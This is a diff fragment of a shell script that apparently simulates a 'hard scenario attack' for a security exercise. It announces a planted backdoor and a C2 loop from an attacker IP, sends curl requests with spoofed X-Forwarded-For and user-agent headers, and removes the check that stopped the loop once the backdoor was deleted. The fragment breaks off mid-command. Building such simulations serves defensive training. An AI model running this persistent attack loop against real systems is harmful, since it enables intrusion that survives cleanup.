@@ -30,13 +30,6 @@ fi
 
 echo "Starting hard scenario attack: backdoor planted ($BACKDOOR_FILE), starting C2 loop from $ATTACKER_IP"
 while true; do
-    # Check if backdoor was deleted
-    if [ ! -f "$BACKDOOR" ]; then
-        echo "Backdoor deleted. Exiting attack loop."
-        exit 0
-    fi
-
-    # Hydra-like attack
     for i in {1..5}; do
         curl -s -H "X-Forwarded-For: $ATTACKER_IP" \
             -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 [$$]" \
